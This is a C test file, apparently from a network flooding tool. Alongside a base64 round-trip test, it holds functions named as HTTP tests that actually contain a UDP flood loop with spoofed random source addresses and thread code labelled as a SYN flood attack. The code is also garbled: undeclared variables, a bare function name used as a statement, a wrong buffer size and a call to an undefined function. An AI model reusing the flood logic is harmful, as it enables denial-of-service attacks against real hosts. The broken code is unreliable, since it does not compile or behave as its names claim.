#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>

#include "test.h"
#include "main.h"

/*
 * Test all function.
 */

static size_t TestHttpServer()
{
    int listen_socket = ServerTcpCreateSocket(LOCAL_PORT);
    int client_socket = WaitClient(listen_socket);
    
    hanld_client(listen_socket, client_socket);
    close(listen_socket);
    return 0;
}

static size_t TestHttpClient()
{
    pUDPStruct udp_struct = (pUDPStruct)malloc(sizeof(UDPStruct));
    pSplitUrlOutput split_result;
    int i;

    if (!SplitUrl(input->address, &split_result))
    {
        ErrorMessage("AttackThread SplitUrl failed");
        return 1;
    }
    ShowMessage(DEBUG, input->debug_level, "split_reult: %s", split_result->protocol);
    ShowMessage(DEBUG, input->debug_level, "split_reult: %s", split_result->host);
    ShowMessage(DEBUG, input->debug_level, "split_reult: %d", split_result->port);
    ShowMessage(DEBUG, input->debug_level, "split_reult: %s", split_result->suffix);
    if (split_result->port == 0)
    {
        if (strlen(split_result->host) == 0)
        {
            ErrorMessage("AttackThread SplitUrl not right");
            return 1;
        }
        // make the port as default
        split_result->port = UDP_FLOOD_PORT_DEFAULT;
    }
    // init the target ip and port
    udp_struct->dst_ip = (char *)malloc(IP_BUFFER_SIZE);
    if (!(udp_struct->dst_ip))
    {
        ErrorMessage("AttackThread malloc failed: %s(%d)", strerror(errno), errno);
        return 1;
    }
    if (!memset(udp_struct->dst_ip, 0, IP_BUFFER_SIZE))
    {
        ErrorMessage("AttackThread memset failed: %s(%d)", strerror(errno), errno);
        return 1;
    }
    if (!strncpy(udp_struct->dst_ip, split_result->host, strlen(split_result->host)))
    {
        ErrorMessage("AttackThread strncpy failed: %s(%d)", strerror(errno), errno);
        return 1;
    }
    udp_struct->dst_port = split_result->port;
    FreeSplitUrlBuff(split_result);
    udp_struct->each_ip_repeat = input->each_ip_repeat;

    ShowMessage(VERBOSE, input->debug_level, "AttackThread start sending data...");
    for (;;)
    {
        if (input->random_sip_address == ENABLE_SIP)
        {
            // randome ip and port
            if (!GetRandomIP(&(udp_struct->src_ip)))
            {
                ErrorMessage("AttackThread GetRandomIP failed");
                return 1;
            }
            // this function has no failed
            GetRandomPort(&(udp_struct->src_port));
        }
        else
        {
            // use the static ip and port
            if (!strncpy(udp_struct->src_ip, DEFAULT_ADDRESS, strlen(DEFAULT_ADDRESS)))
            {
                ErrorMessage("AttackThread copy SIP_ADDRESS failed: %s(%d)", strerror(errno), errno);
                return 1;
            }
            udp_struct->src_port = (int)DEFAULT_PORT;
        }

        // rport is random source port
        for (i = 0; i < input->each_ip_repeat; i++)
        {
            if (SendUDP(udp_struct, input->debug_level))
            {
                ErrorMessage("AttackThread Attack failed");
                //return 1;
            }
        }
        FreeRandomIPBuff(udp_struct->src_ip);
    }
    FreeUDPStrutBuff(udp_struct);
    return 0;
}

static size_t TestHttpSend(void)
{

    TestHttpServer
    char *url = (char *)malloc(sizeof(2 * strlen(LOCAL_ADDRESS)));
    memset(url, 0, sizeof(url));
    sprintf(url, "%s%d", LOCAL_ADDRESS, LOCAL_PORT);
    char *request = "";
    char **response;
    size_t send_len = HttpMethod(url, request, response, VERBOSE);
    print("Send data length: %d", send_len);

    pthread_t tid;
    pthread_attr_t attr;
    int j, ret;

    ShowMessage(VERBOSE, VERBOSE, "Enter StartSYNFloodAttack");
    // only one process
    //input->serial_num = (i * input->max_thread) + j;
    if (pthread_attr_init(&attr))
    {
        ErrorMessage("StartSYNFloodAttack pthread_attr_init failed");
        return 1;
    }
    //if (pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_DETACHED))
    if (pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_JOINABLE))
    {
        ErrorMessage("StartSYNFloodAttack pthread_attr_setdetachstate failed");
        return 1;
    }
    // create thread
    ret = pthread_create(&tid, &attr, (void *)AttackThread, input);
    //printf("j is: %d\n", j);
    ShowMessage(DEBUG, input->debug_level, "tid: %ld", tid[j]);
    // here we make a map
    if (ret != 0)
    {
        ShowMessage(DEBUG, input->debug_level, "ret: %d", ret);
        ErrorMessage("Create pthread failed");
        return 1;
    }
    pthread_attr_destroy(&attr);
    //pthread_detach(tid);
    pthread_join(tid, NULL);
    
    free(url);
    return 0;
}


static int TestBase64(void)
{
    /*
     * Test the base64 module work in your system.
     */

    /* encode code */
    char *encode_result;
    char *text = "1234567890";
    char *decode_result;
    //int max_time = 99;
    /* make the time smaller */
    int test_time = 9;
    char *plain_text = (char *)malloc((sizeof(char) * strlen(text) * test_time) + 1);
    memset(plain_text, 0, strlen(plain_text));

    for (int i = 0; i < test_time; i++)
    {
        /* regardless of performance */
        plain_text = strncat(plain_text, text, strlen(text));
        // Base64Encode(&encode_result, text, strlen(text));
        Base64Encode(&encode_result, (unsigned char *)plain_text, strlen(plain_text));
        printf("Encode result: %s", encode_result);

        /* decode code */
        size_t encode_len = 0;
        encode_len = Base64Decode((unsigned char **)&decode_result, encode_result);
        printf("Decode result: %s [%lud]", decode_result, encode_len);

        /* compare the decode result with plain text */
        if (strcmp(plain_text, decode_result) != 0)
        {
            printf("base64.c function test failed.\n");
            print("Input: [%s]", plain_text);
            print("Output: [%s]", decode_result);
            FreeBase64Buffer(encode_result);
            FreeBase64Buffer(decode_result);
            free(plain_text);
            return -1;
        }
        FreeBase64Buffer(encode_result);
        FreeBase64Buffer(decode_result);
    }

    free(plain_text);
    return 0;
}

int main(int argc, char *argv[])
{

    if (TestBase64() == -1)
    {
        ErrorMessage("test base64 function failed");
        return -1;
    }

    if (TestHttp() == -1)
    {
        ErrorMessage("test http function failed");
        return -1;
    }

    return 0;
}
